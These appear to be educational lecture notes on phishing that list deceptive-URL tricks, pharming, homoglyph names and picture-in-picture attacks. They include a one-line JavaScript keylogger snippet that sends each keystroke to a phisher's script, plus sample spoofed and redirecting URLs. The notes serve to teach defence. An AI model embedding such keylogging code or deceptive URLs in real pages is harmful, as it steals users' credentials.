# Phishing
Phishing is a cybercrime in which a target or targets are contacted by email, telephone or text message by someone posing as a legitimate institution to lure individuals into providing sensitive data such as personally identifiable information, banking and credit card details, and passwords.
## Phishing techniques
* Use confusing URLs
    * http://gadula.net/.Wells.Fargo.com/signin.html
* Use URL with multiple redirection
  * http://www.chase.com/url.php?url=“http://phish.com”
* Host phishing sites on botnet zombies
  * Move from bot to bot using dynamic DNS
* Pharming
  * Poison DNS tables so that address typed by victim (e.g., www.paypal.com) points to the phishing site
  * URL checking doesn’t help!
* Trusted input path problem
```js
<input type="text" name="spoof" onKeyPress="(new Image()).src=’keylogger.php?key=’ +String.fromCharCode( event.keyCode );event.keyCode = 183;” >
```
This script send the keystroke to the phisher and changes character to *.
* Social Engineering Tricks
  * Exploit social relationships
  * Weird names such as Fącebooƙ Şecurițy
* Picture-in-Picture attack
  * The virtual browser of real website is loaded in phiser website
* Passive warnings are unable to block phishing at all
  * Only active warning with strong visual message can block phishing
  * Cost-effective attack 
  * If combined with social engineering, it becomes much more powerful
  * Password alone is not a secure authentication method